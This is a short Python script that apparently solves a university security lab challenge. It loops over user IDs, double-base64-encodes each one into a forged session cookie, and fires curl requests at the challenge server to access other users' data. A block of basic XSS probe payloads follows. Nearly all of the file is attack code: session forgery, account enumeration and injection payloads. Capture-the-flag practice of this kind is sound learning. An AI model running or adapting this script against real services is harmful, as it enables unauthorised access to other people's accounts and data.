import base64
import subprocess
import time

def to_string(integer):
    if(integer < 10):
        return "00"+str(integer)
    elif (integer < 100):
        return "0"+str(integer)

def full_curl_command(userid,sessionid):
    curl = "curl 'https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://snickerboa.it.liu.se' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6.jsp' -H 'Cookie: checksum=dXNlclJvbGU9dXNlcg==; current=WjNWbGMzUXhNZz09; SubSessionID="+sessionid+"; JSESSIONID=82DED98D88684DF44932A7E376B49C11; token=57578968463541043564733263703818927426' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'userId="+ userid+"&useSecurity=true'"
    return curl

userID = 1
while userID < 100:
    encode_this = "0000000000000" + to_string(userID)
    encode_this_bytes = encode_this.encode("ascii")
    encoded_once = base64.b64encode(encode_this_bytes)
    encoded_once_string = encoded_once.decode("ascii")
    encoded_twice = base64.b64encode(encoded_once)
    encoded_twice_string = encoded_twice.decode("ascii")
    print(encode_this,encoded_once_string,encoded_twice_string)
    output = subprocess.run(full_curl_command(encode_this,encoded_twice_string), shell=True,capture_output=True)
    print(output.stdout.decode())
    time.sleep(0.25)
    userID += 1


'''
<script>alert('XSS')</script>
<img src="#" onerror="alert('XSS')" />
<input type="button" onclick="alert('XSS')" />
<iframe src="javascript:alert('XSS');"></iframe>
'''